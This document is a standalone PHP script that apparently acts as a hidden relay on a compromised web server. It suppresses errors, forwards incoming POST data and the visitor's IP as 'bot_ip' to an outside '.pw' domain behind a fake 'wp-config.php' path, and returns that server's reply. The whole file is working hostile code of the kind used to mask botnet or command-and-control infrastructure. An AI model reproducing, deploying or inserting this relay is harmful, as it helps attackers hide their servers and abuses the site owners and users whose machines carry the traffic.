<?php

$url = "http://pjxzzmih.pw/wp-config.php";

@error_reporting(0);
@set_time_limit(0);

//Connect to the original server.
$url = @parse_url($url); 

if (!isset($url['port'])) $url['port'] = ($url['scheme'] == "http") ? 80 : 443; 

if (($real_server = @fsockopen($url['host'], $url['port'])) === false) die("#e1");

if (($data = @file_get_contents('php://input')) === false) $data = '';

if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];

//Form a query.
$request  = "POST {$url['path']}?bot_ip=" . urlencode($_SERVER['REMOTE_ADDR']) . " HTTP/1.1\r\n";
$request .= "Host: {$url['host']}\r\n";

if (!empty($_SERVER['HTTP_USER_AGENT'])) {
	$request .= "User-Agent: {$_SERVER['HTTP_USER_AGENT']}\r\n";
}

$request .= "Content-Length: " . strlen($data) . "\r\n";
$request .= "Connection: close\r\n";

fwrite($real_server, $request . "\r\n" . $data);

//Get an answer.
$result = '';
while (!feof($real_server)) {
	$result .= fread($real_server, 1024);
}

fclose($real_server);

$data = "";
$pos = strpos($result, "\r\n\r\n");
if (!$pos) die();

$isChunked = false;
if (strpos(substr($result, 0, $pos), "chunked") != 0) {
	$isChunked = true;
}

$res = "";
$data = substr($result, $pos + 4);

if ($isChunked) {
	$beg = 0;
	$pos = 0;
	while (($pos = strpos($data, "\r\n", $beg)) !== false) {
		
		$chunkLen = substr($data, $beg, $pos - $beg);
		$chunkLen = hexdec($chunkLen);
		if ($chunkLen == 0) break;
				
		$beg = $pos + 2;
		$res .= substr($data, $beg, $chunkLen);
		
		$beg +=	$chunkLen;
		$beg += 2;
	}
}
else {
	$res = $data;
}

echo $res;

?>
